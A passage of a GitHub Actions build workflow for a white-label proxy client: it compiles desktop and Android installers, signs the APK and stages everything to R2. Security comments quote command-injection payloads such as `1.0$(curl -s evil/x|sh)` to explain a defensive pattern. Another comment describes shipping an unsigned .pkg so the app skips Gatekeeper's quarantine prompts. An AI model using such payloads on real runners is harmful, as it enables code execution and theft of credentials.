# =============================================================================
# build.yml  —  lives in the PUBLIC repo:  codeman9528/QuasarAPP-build
# Copy this file to that repo at  .github/workflows/build.yml
#
# One workflow, end to end: compile every selected platform, sign the Android
# APK, collate the installer index, bundle it, hand it to R2, tell the console.
#
# Desktop needs no signing key at all — the client has no self-updater, so users
# just download the installer from the link the operator publishes. The single
# real key left is the Android release keystore (the OS refuses an upgrade signed
# by a different key), and it lives here as a repo secret. This repo already
# holds PRIVATE_REPO_DEPLOY_KEY, a strictly more valuable credential, so the
# second (private) pipeline that used to exist purely to hold that keystore
# bought no isolation while adding an R2 round-trip, a repository_dispatch and a
# build-state machine that could drop a callback.
#
# Platform jobs stage into R2 under one $BUILD_ID/ prefix; `publish` fans them in.
#
# ── Single-workflow fan-in (ADR-013 + console targets) ───────────────────────
# The console passes `targets` (windows,macos,linux,android,androidtv). A `setup`
# job turns that into a desktop build matrix + an android flag; `compile` and
# `android` run only for selected platforms; `handoff` waits for BOTH and
# dispatches sign.yml EXACTLY ONCE. sign.yml pulls the whole $BUILD_ID/ staging
# and signs whatever is there, so a mixed desktop+android build yields ONE
# signed bundle with ONE merged installers.json — no manifest clobber, one
# callback. (Previously android lived in a separate build-android.yml the
# console never triggered, and two independent sign runs clobbered the manifest.)
#
# ⚠️ AUTHORED WITHOUT A FULL CI DRY RUN — expect iteration. Likely spots: the
#    dynamic matrix (fromJSON), the android job's NDK/gomobile steps (same ones
#    build-android.yml is still shaking out), and the handoff `if:` gating.
#    build-android.yml is KEPT as a manual android-only escape hatch; the console
#    path is THIS file. Do not run both for one build_id (double sign dispatch).
#
# NOTE: pin every third-party action to a commit SHA before production.
# =============================================================================
name: build

on:
  workflow_dispatch:
    inputs:
      slug:      { description: "brand slug (brands/<slug>/brand.yaml must exist in the private repo)", required: true }
      version:   { description: "release version, e.g. 1.4.2", required: true }
      build_id:  { description: "orchestrator build id (echoed back in the dispatch)", required: true }
      notes:     { description: "更新内容 (release notes, shown in the client update dialog)", required: false, default: "" }
      targets:   { description: "comma-separated platforms: windows,macos,linux,android,androidtv (blank = all)", required: false, default: "" }

concurrency:
  group: build-${{ inputs.slug }}-${{ inputs.version }}
  cancel-in-progress: false

# Workflow inputs are exposed ONLY as environment variables and must be read as
# "$SLUG" / "$VERSION" / … inside `run:` blocks. Never write ${{ inputs.* }}
# directly in a script: GitHub substitutes the expression into the script text
# BEFORE bash parses it, so a version like `1.0$(curl -s evil/x|sh)` executes on
# a runner holding the private-repo deploy key and the R2 staging credentials —
# from there an attacker can overwrite another tenant's unsigned artifacts before
# sign.yml signs them. (The console also rejects such versions; this is the
# second layer.) Passing them through `env:` keeps them as inert data.
env:
  SLUG:     ${{ inputs.slug }}
  VERSION:  ${{ inputs.version }}
  BUILD_ID: ${{ inputs.build_id }}
  TARGETS:  ${{ inputs.targets }}
  # R2 staging endpoint + WRITE-ONLY-to-staging token (leak = throwaway bucket only).
  R2_ENDPOINT:           ${{ vars.R2_ENDPOINT }}            # https://<acct>.r2.cloudflarestorage.com
  AWS_ACCESS_KEY_ID:     ${{ secrets.R2_STAGING_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_STAGING_SECRET }}
  AWS_DEFAULT_REGION:    auto
  STAGING_BUCKET:        ${{ vars.STAGING_BUCKET }}         # e.g. quasar-staging
  # aws cli v2.23+ computes CRC checksums that Cloudflare R2 rejects (401).
  # Force the legacy behaviour for EVERY aws call in this file.
  AWS_REQUEST_CHECKSUM_CALCULATION:  when_required
  AWS_RESPONSE_CHECKSUM_VALIDATION:  when_required

jobs:
  # ── Plan which platform jobs run, from the console's `targets` list ──────────
  setup:
    runs-on: ubuntu-latest
    outputs:
      desktop_matrix: ${{ steps.plan.outputs.desktop_matrix }}
      build_android:  ${{ steps.plan.outputs.build_android }}
    steps:
      - name: Plan jobs from targets
        id: plan
        shell: bash
        run: |
          set -euo pipefail
          targets="$TARGETS"
          [ -z "$targets" ] && targets="windows,macos,linux,android,androidtv"
          matrix="[]"; android=false
          IFS=',' read -ra T <<< "$targets"
          for t in "${T[@]}"; do
            t="$(echo "$t" | xargs)"   # trim whitespace
            case "$t" in
              windows) matrix=$(jq -c '. + [{"os":"windows-latest","arch":"windows-x86_64"}]' <<<"$matrix") ;;
              macos)   matrix=$(jq -c '. + [{"os":"macos-14","arch":"darwin-universal"}]' <<<"$matrix") ;;  # universal = arm64 + x86_64 fat binary, one pkg for every Mac
              linux)   matrix=$(jq -c '. + [{"os":"ubuntu-latest","arch":"linux-x86_64"}]' <<<"$matrix") ;;
              android|androidtv) android=true ;;
              *) echo "::warning::unknown target ignored: $t" ;;
            esac
          done
          echo "desktop_matrix=$matrix" >> "$GITHUB_OUTPUT"
          echo "build_android=$android" >> "$GITHUB_OUTPUT"
          echo "· plan: desktop=$matrix  android=$android" | tee -a "$GITHUB_STEP_SUMMARY"

  # ── Desktop compile (one job per selected desktop arch) ──────────────────────
  compile:
    needs: setup
    if: ${{ needs.setup.outputs.desktop_matrix != '[]' }}
    strategy:
      # Partial success: one arch failing must NOT cancel the others — they still
      # build + stage, and handoff publishes whatever succeeded.
      fail-fast: false
      matrix:
        include: ${{ fromJSON(needs.setup.outputs.desktop_matrix) }}
    runs-on: ${{ matrix.os }}
    steps:
      - name: Checkout PRIVATE source (read-only deploy key)
        uses: actions/checkout@v4
        with:
          repository: codeman9528/QuasarAPP
          ssh-key: ${{ secrets.PRIVATE_REPO_DEPLOY_KEY }}

      # Builds float to main HEAD (no per-build ref pin), so record the exact
      # commit that produced this artifact — provenance + reproducibility.
      - name: Record source commit
        id: src
        shell: bash
        run: |
          set -euo pipefail
          sha="$(git rev-parse HEAD)"
          echo "sha=$sha" >> "$GITHUB_OUTPUT"
          echo "· built $SLUG v$VERSION ${{ matrix.arch }} from private@$sha" \
            | tee -a "$GITHUB_STEP_SUMMARY"

      - name: Linux build deps
        if: matrix.os == 'ubuntu-latest'
        run: |
          sudo apt-get update
          # `rpm` provides rpmbuild — without it Tauri silently skips the .rpm
          # bundle. dpkg-dev backs the .deb. (webkit2gtk etc. for the app itself.)
          sudo apt-get install -y libwebkit2gtk-4.1-dev libappindicator3-dev \
            librsvg2-dev patchelf build-essential file rpm dpkg-dev

      # Must match rust-toolchain.toml. rustup honours that file over whatever
      # this action installs, so a lower pin here silently builds with the
      # newer toolchain — and any `targets:` added below would land on the
      # wrong one (Android std missing → "can't find crate for `std`").
      - uses: dtolnay/rust-toolchain@1.88.0
      - uses: Swatinem/rust-cache@v2
      # No version here — pnpm/action-setup@v4 errors if a version is set both
      # here AND via package.json's packageManager (pnpm@9.12.0). Let it read that.
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: pnpm }

      - name: Install Tauri CLI
        run: cargo install tauri-cli --version "^2.1" --locked

      - name: Build UI bundle
        run: |
          pnpm install --frozen-lockfile
          pnpm -C apps/ui build

      - name: Apply brand (patches tauri.conf.json + icons + .cargo env)
        run: cargo run -p quasar-builder -- apply --brand "brands/$SLUG/brand.yaml"

      - name: Regenerate icon set from brand icon.png (if the console uploaded one)
        shell: bash
        run: |
          set -euo pipefail
          if [ -f "brands/$SLUG/icon.png" ]; then
            echo "branding app icon from brands/$SLUG/icon.png"
            cargo tauri icon "brands/$SLUG/icon.png" -o crates/tauri-app/icons
          else
            echo "no brand icon.png — using repo default icons"
          fi

      - name: Fetch geo databases (bundled so the client loads geoip locally,
              not from GitHub at runtime — blocked behind the GFW; ADR-014 §6)
        shell: bash
        run: bash scripts/fetch-geo.sh crates/tauri-app/resources/geo

      - name: Fetch kernel binaries (bundled so a fresh install works offline —
              no first-run OTA download; OTA handles later upgrades)
        shell: bash
        env:
          # Universal macOS → lipo-merge both darwin arches of sing-box/xray into
          # fat binaries so the one universal .app runs on Apple Silicon AND Intel.
          MACOS_UNIVERSAL: ${{ matrix.arch == 'darwin-universal' && '1' || '0' }}
        run: bash scripts/fetch-kernels.sh crates/tauri-app/resources/kernels

      # The desktop TUN root helper (binary + macOS launchd plist) is bundled into
      # the app's Resources/helper (all 3 desktop confs list "resources/helper").
      # Both are gitignored, so CI must stage them or TUN install fails with
      # "helper binary not found" / "launchd plist not found". stage-helper.sh
      # builds the binary AND generates the plist with the brand slug substituted
      # into the launchd Label / socket path (must run AFTER the brand patch so
      # the plist's io.<slug>.helper matches the client's brand-aware socket).
      - name: Build + stage TUN root helper (binary + brand plist)
        shell: bash
        env:
          QUASAR_APP_SLUG: ${{ inputs.slug }}
        run: |
          # Universal macOS → build the helper as a fat arm64+x86_64 binary too,
          # else TUN breaks on Intel (see stage-helper.sh). Other arches: host build.
          if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
            bash scripts/stage-helper.sh universal-apple-darwin
          else
            bash scripts/stage-helper.sh
          fi

      # macOS ships a UNIVERSAL binary (arm64 + x86_64) so one .pkg installs on
      # every Mac. universal-apple-darwin needs BOTH rust std targets present.
      - name: Add macOS universal rust targets
        if: matrix.arch == 'darwin-universal'
        run: rustup target add aarch64-apple-darwin x86_64-apple-darwin

      - name: Build app (installers)
        shell: bash
        run: |
          if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
            cargo tauri build --target universal-apple-darwin
          else
            cargo tauri build
          fi

      - name: Collect installer
        id: collect
        shell: bash
        run: |
          set -euo pipefail
          # --target universal-apple-darwin nests the bundle under the target triple.
          if [ "${{ matrix.arch }}" = "darwin-universal" ]; then
            base="target/universal-apple-darwin/release/bundle"
          else
            base="target/release/bundle"
          fi
          case "${{ matrix.arch }}" in
            linux-*)
              # The AppImage is a portable, self-contained installer.
              inst=$(ls "$base"/appimage/*.AppImage | head -1)
              # Also ship .deb + .rpm: they use the SYSTEM webkit2gtk (a package
              # dependency, not bundled) so they're ~1/3 the AppImage's size. They
              # Staged under their own platform keys (linux-*-deb / -rpm) so
              # under their own platform keys (linux-*-deb / -rpm) so installers.json
              # lists all three. Best-effort (a target may not have built).
              deb=$(ls "$base"/deb/*.deb 2>/dev/null | head -1 || true)
              rpm=$(ls "$base"/rpm/*.rpm 2>/dev/null | head -1 || true)
              echo "deb=$deb" >> "$GITHUB_OUTPUT"
              echo "deb_name=$([ -n "$deb" ] && basename "$deb" || echo '')" >> "$GITHUB_OUTPUT"
              echo "rpm=$rpm" >> "$GITHUB_OUTPUT"
              echo "rpm_name=$([ -n "$rpm" ] && basename "$rpm" || echo '')" >> "$GITHUB_OUTPUT"
              ;;
            windows-*)
              inst=$(ls "$base"/nsis/*-setup.exe | head -1) ;;
            darwin-*)
              # Ship a .pkg installer, NOT the .dmg. A pkg installer writes the app
              # FRESH into /Applications, so the installed app carries no
              # com.apple.quarantine flag → it launches with zero Gatekeeper
              # prompts even though we don't notarize (this is how the mainstream
              # un-notarized clients ship). A dragged-out .dmg app inherits the
              # download's quarantine → the "已损坏" dead-end on Apple Silicon.
              # Unsigned pkg over an ad-hoc-signed app — no Apple Developer account.
              # Locate the .app with a shell glob, not `ls` — a glob keeps the exact
              # bytes of a non-ASCII product name and never needs a subshell.
              app=""
              for d in "$base"/macos/*.app; do [ -d "$d" ] && { app="$d"; break; }; done
              if [ -z "$app" ]; then
                echo "::error::no .app under $base/macos"; ls -la "$base/macos" || true; exit 1
              fi
              appname=$(basename "$app" .app)

              # Identifier + version come from the SOURCE OF TRUTH (tauri.conf.json,
              # which quasar-builder just patched from brand.yaml) and the workflow
              # input — NOT read back out of the built Info.plist.
              #
              # This step had never once succeeded on macOS: every macOS job in the
              # pipeline's history died here on
              #   Print: Entry, ":CFBundleIdentifier", Does Not Exist
              # PlistBuddy prints an extra "File Doesn't Exist" line when the file is
              # missing, and that line was absent — so the plist existed but lacked
              # the key. Rather than keep guessing why the bundler omitted it, stop
              # depending on the round-trip: we already know both values.
              ident=$(python3 -c "import json;print(json.load(open('crates/tauri-app/tauri.conf.json')).get('identifier',''))")
              ver="$VERSION"
              if [ -z "$ident" ]; then
                echo "::error::tauri.conf.json has no identifier — brand apply failed?"; exit 1
              fi
              echo "· pkg identifier=$ident version=$ver app=$app"
              a="${{ matrix.arch }}"; a="${a#darwin-}"
              comp="$RUNNER_TEMP/component.pkg"
              inst="$RUNNER_TEMP/${appname}_${ver}_${a}.pkg"
              pkgbuild --install-location /Applications --component "$app" \
                       --identifier "$ident" --version "$ver" "$comp"
              # productbuild wraps the component into the standard installer wizard.
              # Use an EXPLICIT distribution with hostArchitectures="arm64,x86_64" so
              # the universal pkg installs on BOTH Apple Silicon and Intel — a bare
              # `productbuild --package` can synthesize a distribution that restricts
              # to the build arch (arm64), silently locking out Intel. The payload
              # .app is a fat binary, so both arches also RUN. (printf, not heredoc —
              # robust against YAML/case indentation.)
              dist="$RUNNER_TEMP/distribution.xml"
              printf '%s\n' \
                '<?xml version="1.0" encoding="utf-8"?>' \
                '<installer-gui-script minSpecVersion="2">' \
                "  <title>${appname}</title>" \
                '  <options customize="never" require-scripts="false" hostArchitectures="arm64,x86_64"/>' \
                '  <volume-check><allowed-os-versions><os-version min="11.0"/></allowed-os-versions></volume-check>' \
                "  <choices-outline><line choice=\"default\"><line choice=\"${ident}\"/></line></choices-outline>" \
                "  <choice id=\"default\" title=\"${appname}\"/>" \
                "  <choice id=\"${ident}\" visible=\"false\" customLocation=\"/Applications/\"><pkg-ref id=\"${ident}\"/></choice>" \
                "  <pkg-ref id=\"${ident}\" version=\"${ver}\" onConclusion=\"none\">component.pkg</pkg-ref>" \
                '</installer-gui-script>' \
                > "$dist"
              productbuild --distribution "$dist" --package-path "$RUNNER_TEMP" "$inst" ;;
          esac
          echo "installer=$inst" >> "$GITHUB_OUTPUT"
          echo "installer_name=$([ -n "$inst" ] && basename "$inst" || echo '')" >> "$GITHUB_OUTPUT"

      - name: Upload installer to R2 staging
        shell: bash
        env:
          # Step outputs are DERIVED FROM THE BRAND NAME (Tauri names the bundle
          # after productName), which a tenant controls. Interpolating them into
          # a `run:` script is the same injection class the `version` input had:
          # GitHub substitutes the text before bash parses it, so a brand named
          # `Q$(curl -s x|sh)` executes on a runner holding the private-repo
          # deploy key and the R2 + keystore credentials. Pass as data.
          INSTALLER:      ${{ steps.collect.outputs.installer }}
          INSTALLER_NAME: ${{ steps.collect.outputs.installer_name }}
          DEB:            ${{ steps.collect.outputs.deb }}
          DEB_NAME:       ${{ steps.collect.outputs.deb_name }}
          RPM:            ${{ steps.collect.outputs.rpm }}
          RPM_NAME:       ${{ steps.collect.outputs.rpm_name }}
        run: |
          set -euo pipefail
          bid="$BUILD_ID"; arch="${{ matrix.arch }}"
          # A universal macOS build is ONE fat artifact that serves both Apple
          # Silicon and Intel. Publish it under both real-arch keys so a per-arch
          # consumer of the staging layout still finds it.
          if [ "$arch" = "darwin-universal" ]; then keys="darwin-aarch64 darwin-x86_64"; else keys="$arch"; fi
          # Single-part PUT (s3api put-object), NOT `aws s3 cp`: cp goes multipart
          # for files >8MB and R2 bucket-scoped tokens reject CreateMultipartUpload.
          for k in $keys; do
            if [ -n "$INSTALLER_NAME" ]; then
              aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
                --bucket "$STAGING_BUCKET" \
                --key "$bid/installer/$k/$INSTALLER_NAME" \
                --body "$INSTALLER" >/dev/null
            else
              echo "no installer bundle for $arch (check tauri.conf bundle targets)"
            fi
          done
          # Extra Linux formats under their own platform keys (empty on non-Linux).
          if [ -n "$DEB_NAME" ]; then
            aws s3api put-object --endpoint-url "$R2_ENDPOINT" --bucket "$STAGING_BUCKET" \
              --key "$bid/installer/${arch}-deb/$DEB_NAME" \
              --body "$DEB" >/dev/null
          fi
          if [ -n "$RPM_NAME" ]; then
            aws s3api put-object --endpoint-url "$R2_ENDPOINT" --bucket "$STAGING_BUCKET" \
              --key "$bid/installer/${arch}-rpm/$RPM_NAME" \
              --body "$RPM" >/dev/null
          fi

  # ── Android compile (universal APK; runs only when android/androidtv selected) ─
  # Mirrors build-android.yml's `apk` job, MINUS its own sign dispatch — the
  # shared `handoff` job dispatches sign.yml once for desktop + android together.
  android:
    needs: setup
    if: ${{ needs.setup.outputs.build_android == 'true' }}
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PRIVATE source (read-only deploy key)
        uses: actions/checkout@v4
        with:
          repository: codeman9528/QuasarAPP
          ssh-key: ${{ secrets.PRIVATE_REPO_DEPLOY_KEY }}

      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: "17" }

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
      - name: Install NDK + platform + build-tools
        run: sdkmanager "ndk;28.0.13004108" "platforms;android-34" "build-tools;34.0.0"

      # Pin NDK_HOME to the exact NDK we just installed (setup-android sets
      # ANDROID_NDK_ROOT only as a process var; tauri android init hard-fails on a
      # bad NDK_HOME). Exporting to $GITHUB_ENV makes it valid for every later step.
      - name: Pin NDK_HOME
        run: |
          NDK="$ANDROID_HOME/ndk/28.0.13004108"
          test -d "$NDK" || { echo "NDK not at $NDK"; ls "$ANDROID_HOME/ndk" || true; exit 1; }
          echo "NDK_HOME=$NDK" >> "$GITHUB_ENV"
          echo "ANDROID_NDK_ROOT=$NDK" >> "$GITHUB_ENV"
          echo "ANDROID_NDK_HOME=$NDK" >> "$GITHUB_ENV"

      # Go is needed for the gomobile AAR (the embedded sing-box core).
      - uses: actions/setup-go@v5
        with: { go-version: "1.23" }

      - uses: dtolnay/rust-toolchain@1.88.0
        with:
          targets: aarch64-linux-android,armv7-linux-androideabi
      - uses: Swatinem/rust-cache@v2
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: pnpm }

      - name: Install Tauri CLI
        run: cargo install tauri-cli --version "^2.1" --locked

      - name: Build UI bundle
        run: |
          pnpm install --frozen-lockfile
          pnpm -C apps/ui build

      - name: Apply brand
        if: inputs.slug != ''
        run: cargo run -p quasar-builder -- apply --brand "brands/$SLUG/brand.yaml"

      # Regenerate the FULL icon set (incl. Android launcher mipmaps) from the
      # operator's uploaded logo so the console's custom icon reaches the APK.
      - name: Regenerate icon set from brand icon.png (if the console uploaded one)
        if: inputs.slug != ''
        shell: bash
        run: |
          set -euo pipefail
          if [ -f "brands/$SLUG/icon.png" ]; then
            echo "branding app icon from brands/$SLUG/icon.png"
            cargo tauri icon "brands/$SLUG/icon.png" -o crates/tauri-app/icons
          else
            echo "no brand icon.png — using repo default icons"
          fi

      # Android-TV 16:9 banner (320×180) from the brand icon — shown on the TV
      # home launcher. Best-effort: a committed default tv_banner.png already
      # exists in the overlay res, so a failure here just keeps the default (the
      # manifest's @drawable/tv_banner always resolves → build never breaks).
      - name: Generate branded TV banner (Android)
        if: inputs.slug != ''
        shell: bash
        run: |
          SRC="brands/$SLUG/icon.png"
          DEST="crates/tauri-app/android/app/src/main/res/drawable/tv_banner.png"
          [ -f "$SRC" ] || { echo "no brand icon — keeping default TV banner"; exit 0; }
          sudo apt-get install -y imagemagick >/dev/null 2>&1 || true
          M=convert; command -v magick >/dev/null 2>&1 && M=magick
          if "$M" -size 320x180 "xc:#191228" \( "$SRC" -resize 132x132 \) -gravity center -composite "$DEST"; then
            echo "branded TV banner from $SRC"
          else
            echo "banner generation failed — keeping committed default"
          fi

      - name: Fetch geo databases (bundled into the apk assets)
        run: bash scripts/fetch-geo.sh crates/tauri-app/resources/geo || echo "geo fetch failed (non-fatal)"

      # White-label identity split: Kotlin package + JNI exports are hardcoded
      # io.quasar.app, so the android CODE identity must stay io.quasar.app.
      # Capture the brand identifier as the applicationId, reset the identifier to
      # io.quasar.app so `tauri android init` generates code under io.quasar.app;
      # finalize-gradle re-applies ANDROID_APP_ID as the applicationId only.
      - name: Pin android code identity to io.quasar.app; brand the applicationId
        if: inputs.slug != ''
        run: |
          conf=crates/tauri-app/tauri.conf.json
          brand_id="$(python3 -c "import json;print(json.load(open('$conf'))['identifier'])")"
          echo "ANDROID_APP_ID=$brand_id" >> "$GITHUB_ENV"
          python3 -c "import json;p='$conf';d=json.load(open(p));d['identifier']='io.quasar.app';json.dump(d,open(p,'w'),indent=2)"
          echo "code identity → io.quasar.app; applicationId → $brand_id"

      - name: Build embedded sing-box core AAR (arm64 + arm7)
        env:
          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
        run: TARGETS=android/arm64,android/arm bash scripts/build-qcore-aar.sh

      - name: Init Android project (generates gen/android)
        env:
          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
        run: |
          cd crates/tauri-app
          cargo tauri android init

      - name: Finalize gradle (link the core AAR) + overlay VPN/L3 sources
        run: |
          bash scripts/android-finalize-gradle.sh
          bash scripts/android-overlay.sh

      - name: Build UNSIGNED RELEASE universal APK (arm64-v8a + armeabi-v7a)
        env:
          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
        # No ANDROID_KEYSTORE in env → build-android-apk.sh leaves it unsigned;
        # sign.yml signs it in the private repo with the real release key.
        run: bash scripts/build-android-apk.sh

      - name: Collect the unsigned release APK
        id: collect
        shell: bash
        run: |
          set -euo pipefail
          apk="$(find crates/tauri-app/gen/android/app/build/outputs/apk/universal/release -name '*.apk' | head -1 || true)"
          [ -n "$apk" ] || { echo "no release APK produced"; find crates/tauri-app/gen/android -name '*.apk'; exit 1; }
          # Rename to the operator's brand name + version (desktop bundles are
          # already productName-named; keep Android consistent).
          product="$(python3 -c "import json;print(json.load(open('crates/tauri-app/tauri.conf.json'))['productName'])")"
          safe="$(printf '%s' "$product" | tr ' /' '__')"
          newname="${safe}_${VERSION}_universal.apk"
          mv "$apk" "$(dirname "$apk")/$newname"
          apk="$(dirname "$apk")/$newname"
          echo "apk=$apk" >> "$GITHUB_OUTPUT"
          echo "name=$newname" >> "$GITHUB_OUTPUT"
          echo "· built $apk" | tee -a "$GITHUB_STEP_SUMMARY"

      - name: Upload UNSIGNED APK to R2 staging (installer/android-universal)
        shell: bash
        env:
          APK:      ${{ steps.collect.outputs.apk }}
          APK_NAME: ${{ steps.collect.outputs.name }}
        run: |
          set -euo pipefail
          aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
            --bucket "$STAGING_BUCKET" \
            --key "$BUILD_ID/installer/android-universal/$APK_NAME" \
            --body "$APK" >/dev/null
          echo "· uploaded to s3://$STAGING_BUCKET/$BUILD_ID/installer/android-universal/$APK_NAME"

      # NO run-artifact upload here. This repo is PUBLIC, and run artifacts are
      # downloadable by any GitHub account for their whole retention window — the
      # APK embeds the brand's oss_enc_key, invite code, panel endpoints and
      # identity. The same APK is already staged to R2 (previous step) where
      # sign.yml picks it up, so nothing is lost; for manual QA, pull it from the
      # staging bucket instead.

  # ── Fan-in: dispatch sign.yml ONCE after all selected builds succeed ─────────
  # ── Fan-in: sign the APK, collate, bundle, deliver, tell the console ────────
  #
  # Everything used to be dispatched to a SECOND workflow in the private repo,
  # purely because that's where the signing keys lived. The desktop client no
  # longer self-updates, so desktop needs no key at all, and the only key left is
  # the Android release keystore — which lives here as a repo secret, exactly as
  # this repo already holds PRIVATE_REPO_DEPLOY_KEY (a strictly more valuable
  # credential). Keeping a whole second pipeline for it bought no real isolation
  # while adding an R2 round-trip, a repository_dispatch, and a build-state
  # machine that could lose a callback.
  publish:
    needs: [setup, compile, android]
    # Partial success: publish whatever actually staged, as long as the run wasn't
    # cancelled and setup produced a plan — even if SOME platforms failed.
    # (fail-fast:false leaves compile.result == 'failure' while the successful
    # legs still staged.) The "nothing staged" case is caught below and fails the
    # job so the console hears 'failed' instead of a false 'published'.
    if: >-
      ${{ !cancelled() && needs.setup.result == 'success'
          && (needs.compile.result != 'skipped' || needs.android.result != 'skipped') }}
    runs-on: ubuntu-latest          # MUST be Linux (1x multiplier) — never mac/win.
    env:
      # Only used to READ the unsigned artifacts back from the staging bucket and
      # to write the finished bundle there. There is NO release-OSS upload:
      # quasar-publish runs --local-only and the operator downloads the bundle
      # through the console to publish on their own OSS.
      NOTES: ${{ inputs.notes }}
    steps:
      # The private source is needed for quasar-publish + brands/<slug>/brand.yaml
      # + the release-readme template.
      - name: Checkout PRIVATE source (read-only deploy key)
        uses: actions/checkout@v4
        with:
          repository: codeman9528/QuasarAPP
          ssh-key: ${{ secrets.PRIVATE_REPO_DEPLOY_KEY }}

      # Rust is needed only to build+run quasar-publish (small, and rust-cache'd).
      - uses: dtolnay/rust-toolchain@1.88.0
      - uses: Swatinem/rust-cache@v2

      - name: Pull staged artifacts from R2
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p staging
          aws s3 cp --endpoint-url "$R2_ENDPOINT" --recursive \
            "s3://$STAGING_BUCKET/$BUILD_ID/" staging/

      - name: Detect staged Android APK
        id: apk
        shell: bash
        run: |
          apk="$(find staging/installer -name '*.apk' 2>/dev/null | head -1 || true)"
          echo "path=$apk" >> "$GITHUB_OUTPUT"
          if [ -n "$apk" ]; then echo "found=true" >> "$GITHUB_OUTPUT"; else echo "found=false" >> "$GITHUB_OUTPUT"; fi

      - name: Set up JDK for apksigner
        if: steps.apk.outputs.found == 'true'
        uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: "17" }
      - name: Set up Android build-tools (zipalign + apksigner)
        if: steps.apk.outputs.found == 'true'
        uses: android-actions/setup-android@v3
      - name: Install build-tools
        if: steps.apk.outputs.found == 'true'
        run: sdkmanager "build-tools;34.0.0"

      # The one real key in the whole pipeline. Android refuses to install an
      # upgrade signed by a different key than the installed app, so this must be
      # STABLE across releases — a rotated key forces every user to uninstall
      # (losing their data) before they can update.
      - name: Sign the Android APK with the release keystore
        if: steps.apk.outputs.found == 'true'
        shell: bash
        env:
          ANDROID_KEYSTORE_BASE64:   ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
          ANDROID_KEY_ALIAS:         ${{ secrets.ANDROID_KEY_ALIAS }}
          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          ANDROID_KEY_PASSWORD:      ${{ secrets.ANDROID_KEY_PASSWORD }}
          APK_PATH:                  ${{ steps.apk.outputs.path }}
        run: |
          set -euo pipefail
          apk="$APK_PATH"
          if [ -z "${ANDROID_KEYSTORE_BASE64:-}" ]; then
            echo "::error::APK staged but ANDROID_KEYSTORE_BASE64 secret is unset — cannot ship an unsigned APK"
            exit 1
          fi
          signed="${apk%-unsigned.apk}"; [ "$signed" = "$apk" ] && signed="${apk%.apk}-signed"; signed="${signed}.apk"
          scripts/android-sign-apk.sh "$apk" "$signed"
          # Drop the unsigned APK so the installers step publishes only the signed one.
          [ "$signed" != "$apk" ] && rm -f "$apk" || true

      - name: Collate installers → installers.json (local, no upload)
        shell: bash
        run: |
          set -euo pipefail
          args=()
          if [ -d staging/installer ]; then
            for dir in staging/installer/*/; do
              arch="$(basename "$dir")"
              f="$(ls "$dir"* 2>/dev/null | head -1 || true)"
              [ -n "$f" ] && args+=( --platform "$arch=$f" )
            done
          fi
          if [ ${#args[@]} -gt 0 ]; then
            cargo run -p quasar-publish -- installers \
              --brand "brands/$SLUG/brand.yaml" \
              --version "$VERSION" \
              --notes "$NOTES" \
              --local-only \
              "${args[@]}"
          else
            echo "no installers staged; skipping installers.json"
          fi

      # If EVERY platform failed, nothing staged → no index was collated. Fail here
      # so the failure callback fires (build → failed) instead of publishing an
      # empty release and reporting a false "published".
      - name: Fail if nothing was built (all platforms failed)
        run: |
          if [ ! -f dist/publish/installers.json ]; then
            echo "::error::no platform produced an installer — nothing to publish"
            exit 1
          fi

      - name: Bundle release for operator download
        if: success()
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p release-bundle
          cp -rf dist/publish/. release-bundle/ 2>/dev/null || true
          # Installer packages, flattened.
          find staging -type f \
            \( -name '*.AppImage' -o -name '*.deb' -o -name '*.rpm' \
               -o -name '*.exe' -o -name '*.msi' \
               -o -name '*.pkg' -o -name '*.dmg' -o -name '*.apk' \) \
            -exec cp -f {} release-bundle/ \; 2>/dev/null || true
          # Operator-facing guide (what each artifact is + how to publish). Kept as
          # a tracked template so it's not an unwieldy YAML heredoc. Substitute the
          # brand slug + version AND the operator's OWN configured directories
          # (read from brands/<slug>/brand.yaml) so it names the exact URLs they
          # upload to, not a placeholder.
          BRAND="brands/${SLUG}/brand.yaml"
          UPDATE_BASE=$(grep -m1 -E '^[[:space:]]*update_base_url:' "$BRAND" 2>/dev/null \
            | sed -E 's/^[^:]*:[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/')
          # config.bin lives at the first fetch_mirrors entry, else update_base_url.
          CONFIG_BASE=$(awk '/^[[:space:]]*fetch_mirrors:/{f=1;next} f&&/^[[:space:]]*-/{gsub(/^[[:space:]]*-[[:space:]]*"?|"?[[:space:]]*$/,"");print;exit} f&&/^[[:space:]]*[a-z_]+:/{exit}' "$BRAND" 2>/dev/null)
          [ -n "$UPDATE_BASE" ] || UPDATE_BASE="（见 console 品牌里填的「软件更新源」）"
          [ -n "$CONFIG_BASE" ] || CONFIG_BASE="$UPDATE_BASE"
          # Use a non-/ sed delimiter (URLs contain /).
          sed -e "s#__SLUG__#${SLUG}#g" -e "s#__VERSION__#${VERSION}#g" \
              -e "s#__UPDATE_BASE__#${UPDATE_BASE}#g" -e "s#__CONFIG_BASE__#${CONFIG_BASE}#g" \
            docs/build-farm/release-readme.txt > "release-bundle/发布说明.txt" 2>/dev/null || true
          # Build provenance — appended to the BOTTOM of 发布说明.txt. build_id is
          # unique per console build and is ALSO baked into the binary (设置→关于
          # shows the same #id + time), so a stale same-version zip is caught by
          # cross-checking these two. Directly answers "这个包到底新不新".
          {
            echo ""
            echo "======================================================================"
            echo "构建信息 —— 用于核对这个包是不是最新的"
            echo "──────────────────────────────────────────────"
            echo "品牌:      ${SLUG}"
            echo "版本:      ${VERSION}"
            echo "构建ID:    ${BUILD_ID}"
